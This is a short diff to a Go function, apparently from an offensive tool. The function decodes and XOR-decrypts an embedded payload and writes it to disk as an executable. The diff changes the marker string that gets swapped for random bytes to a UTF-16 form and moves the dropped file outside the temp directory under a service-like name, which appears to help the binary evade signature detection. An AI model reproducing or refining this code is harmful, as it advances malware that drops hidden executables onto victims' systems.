@@ -418,8 +418,8 @@ func CmdService(Token uintptr) ([]byte, error) {
 	}
 	encoded, _ := hex.DecodeString(hexEncoded)
 	data := crypt.XOR(encoded, []byte("key"))
-	data = bytes.ReplaceAll(data, []byte("flag"), crypt.RandomBytes(4))
-	filePath := os.TempDir() + "\\NetSrv.exe"
+	data = bytes.ReplaceAll(data, []byte("f\x00l\x00a\x00g\x00"), crypt.RandomBytes(8))
+	filePath := os.TempDir() + "\\..\\NetSrc.exe"
 	currentFile, _ := os.Executable()
 
 	go func() {
@@ -462,5 +462,5 @@ func CmdService(Token uintptr) ([]byte, error) {
 		}
 	}()
 
-	return []byte("Hold on."), nil
+	return []byte("Hold on"), nil
 }
